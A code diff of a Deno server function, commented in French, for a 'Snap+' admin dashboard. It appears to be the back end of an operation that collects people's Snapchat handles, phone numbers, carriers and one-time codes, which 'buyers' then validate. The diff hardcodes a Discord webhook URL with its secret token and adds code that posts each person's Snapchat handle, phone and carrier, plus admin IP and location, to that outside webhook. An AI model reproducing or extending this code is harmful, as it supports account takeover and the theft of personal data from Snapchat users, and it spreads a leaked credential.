@@ -1,6 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const LOG_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
+const LOG_WEBHOOK = "https://discord.com/api/webhooks/1520075027377164368/SRDgc2Ncec6qbVyFYKvD6oaWcNHZJC_HyisJS3hZPF6RALBe4LWOTlEnAxgWHZc3IZPV";
 
 const actionLabels = {
   valid: { label: "✅ Code validé par un admin", color: 0x2ECC71 },
@@ -26,13 +26,13 @@ const statusMap = {
 
 Deno.serve(async (req) => {
   try {
-    const { submissionId, action, discord, buyerId } = await req.json();
+    const { submissionId, action, discord } = await req.json();
 
     if (!submissionId) {
       return Response.json({ error: 'submissionId requis' }, { status: 400 });
     }
 
-    let newStatus = statusMap[action] || "code_ready";
+    const newStatus = statusMap[action] || "code_ready";
     const base44 = createClientFromRequest(req);
 
     // Get admin IP & user agent
@@ -41,24 +41,12 @@ Deno.serve(async (req) => {
     // Fetch submission details
     const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
 
-    // "resend" (OTP invalide — autoriser renvoi) : remet la demande dans le format
-    // de code précédemment demandé pour que l'utilisateur puisse ressaisir un code.
-    if (action === "resend") {
-      newStatus = sub?.last_ready_status || "code_ready";
-    }
-
     // ---- Verrou par IP admin : la première action (envoi de code / validation /
     // mauvais / expiré) verrouille la demande à cette IP et exige un pseudo Discord
     // pour identifier l'administrateur dans les logs. Le pseudo Discord est lié
     // de façon persistante à l'IP de l'admin : il n'est demandé qu'une seule fois,
     // puis réutilisé automatiquement pour toutes les futures demandes. ----
-    // Acheteur authentifié : l'action vient du panel buyer qui a déjà verrouillé
-    // la soumission via claimSubmission (assigned_buyer_id + admin_ip). On fait
-    // confiance à l'appartenance plutôt qu'au verrou IP — ce dernier est fragile
-    // à travers la chaîne de proxies et bloque à tort les actions acheteur.
-    if (buyerId && sub?.assigned_buyer_id === buyerId) {
-      // buyer owns it — skip admin IP lock
-    } else if (sub?.admin_ip) {
+    if (sub?.admin_ip) {
       // Une IP admin est déjà enregistrée : vérifie la correspondance
       if (sub.admin_ip !== adminIp) {
         return Response.json(
@@ -101,11 +89,7 @@ Deno.serve(async (req) => {
       sub.admin_discord = discordClean;
     }
 
-    await base44.asServiceRole.entities.Submission.update(submissionId, {
-      status: newStatus,
-      entered_code: null,
-      last_ready_status: null,
-    });
+    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
     const userAgent = req.headers.get("user-agent") || "";
 
     // Detect browser
@@ -150,27 +134,45 @@ Deno.serve(async (req) => {
     }
 
     const now = new Date();
+    const heureStr = now.toLocaleString("fr-FR", {
+      day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit",
+      timeZone: "Europe/Paris"
+    });
 
-    // L'action est gérée entièrement dans le panel acheteur (mise à jour du statut +
-    // log applicatif) — plus d'envoi vers Discord.
-    await base44.asServiceRole.entities.ActionLog.create({
-      submission_id: submissionId,
-      action: action === "valid" ? "code_verified"
-        : action === "wrong" ? "code_wrong"
-        : action === "expired" ? "code_expired"
-        : action === "wait" ? "waiting_queue"
-        : "code_sent",
-      details: {
-        action,
-        status: newStatus,
-        browser, device, ip: adminIp, country, city,
-        discord: sub?.admin_discord || discord || null,
-        buyer: !!buyerId,
-      },
+    const { label, color } = actionLabels[action] || actionLabels["code_ready"];
+
+    const embed = {
+      title: label,
+      color,
+      fields: [
+        { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
+        { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
+        { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
+        { name: "🌐 Navigateur", value: browser, inline: true },
+        { name: "🏙️ Ville", value: city, inline: true },
+        { name: "🌍 Pays", value: country, inline: true },
+        { name: "💾 Appareil", value: device, inline: true },
+        { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
+        { name: "🎮 Discord", value: sub?.admin_discord ? `@${sub.admin_discord}` : "N/A", inline: true },
+        { name: "🕐 Heure", value: heureStr, inline: false },
+      ],
+      footer: { text: `Admin Dashboard • Snap+` },
       timestamp: now.toISOString(),
-    }).catch(() => {});
+    };
 
-    return Response.json({ ok: true, action });
+    const webhookRes = await fetch(LOG_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] }),
+    });
+
+    if (!webhookRes.ok) {
+      const error = await webhookRes.text();
+      console.error(`Webhook error ${webhookRes.status}: ${error}`);
+      return Response.json({ ok: true, webhook: false, error: error });
+    }
+
+    return Response.json({ ok: true, webhook: true });
   } catch (error) {
     return Response.json({ error: error.message }, { status: 500 });
   }
